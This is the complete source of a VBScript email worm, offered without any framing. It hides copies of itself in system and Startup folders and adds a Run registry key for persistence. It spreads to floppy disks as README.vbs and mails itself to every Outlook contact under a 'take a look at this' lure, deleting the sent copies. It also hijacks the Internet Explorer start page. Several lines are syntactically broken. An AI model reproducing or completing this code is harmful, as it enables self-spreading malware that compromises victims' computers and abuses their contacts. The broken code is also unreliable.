   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem *************Created By*************
   rem ************************************
   rem *****Someone Who Isn't Prideful*****
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   rem ************************************
   Dim fso, wshshell, mwa, strtp, flppy
   On Error Resume Next
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\windows\Intr.vbs", True
   set wshshell = Wscript.CreateObject("Wscript.shell")
   wshshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Startit","C:\Windows\Intr.vbs"
   set mwa = C:\windows\Intr.vbs
   mwa.attributes = 3
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\Start Menu\Programs\StartUp\Ink.vbs", True
   set strtp = "C:\Windows\Start Menu\Programs\StartUp\Ink.vbs"
   strtp.attributes = 3
   set flppy = fso.GetDrive("A")
   if flppy.IsReady then
   fso.CopyFile Wscript.ScriptFullName, "A:\README.vbs", True
   end if
   Dim ootlook, ec, mise, victim, rlp, male
   set ootlook=CreateObject("Outlook.Application")
   set ec=Wscript.CreateObject("Outlook.Application")
   set mise=ec.GetNameSpace("MAPI")
   set victim=mise.AddressLists(1)
   For rlp=1 To victim.AddressEntries.Count
   set male=ootlook.CreateItem(0)
   male.To=ootlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(rlp)
   male.Subject="I think you should take a look at this"
   male.Body="It's in the attachments. It may be something that you need to see."
   male.attachments.add Wscript.ScriptFullName
   male.DeleteAfterSubmit=True
   male.send
   ootlook.quit


   if Day(Now) = 5 And Month(Now) = 9 then
   wshshell.regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page="http://www.google.com/search?q=HAPPY+BIRTHDAY!!!&ie=UTF-8&oe=UTF-8"
   elseif Day(Now) = 1 And Month(Now) = 1 then
   wshshell.regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page="http://and.yet.another.year.to.live.through"
   else
   wshshell.regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page="http://www.extremecleaning.net"
   end if

   Dim dait, daitstr, exec
   set dait = "C:\Windows\dait.txt"
   If fso.FileExists("C:\Windows\dait.txt") then
   set daitstr = OpenTextFile(dait,1)
   set exec = daitstr-1
   if exec=Day(Now) then
   dait.Delete
   MsgBox "File Not Found",48,"Error"
   end if
   else
   fso.CreateTextFile("C:\Windows\dait.txt,true,false")
   dait.writeline Day(Now)
   dait.close
   dait.attributes = 3
   end if
   end sub
